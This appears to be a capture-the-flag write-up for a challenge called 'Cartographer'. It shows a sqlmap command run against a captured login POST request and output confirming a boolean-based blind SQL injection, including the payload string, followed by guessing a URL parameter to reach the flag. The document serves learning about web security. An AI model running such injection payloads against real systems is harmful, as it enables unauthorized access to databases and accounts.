# Cartographer

## Testing for sql injection

First off, capture the POST request to the website and save it to sql-post.txt.
```
~# sqlmap -v -r sql-post.txt --level 5 --risk 3

...

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 361 HTTP(s) requests:
---
Parameter: username (POST)
	Type: boolean-based blind
	Title: OR boolean-based blind - WHERE or HAVING clause
	Payload: username=-3401' OR 8600=8600-- AHdZ&password=adm
	Vector: OR [INFERENCE]
---
[23:16:57] [INFO] testing MySQL
[23:16:57] [INFO] confirming MySQL
[23:16:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[23:16:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/88.198.233.174'
```

Sweet! This payload redirects to panel.php?info=home

Three is a text box which reads
“Cartographer
Is Still
Under Construction!”

## Guess game
Running sqlmap on ‘?info=‘ gives no result, yet playing around with the argument is a way to go.
Requesting panel.php?info=flag displays the flag
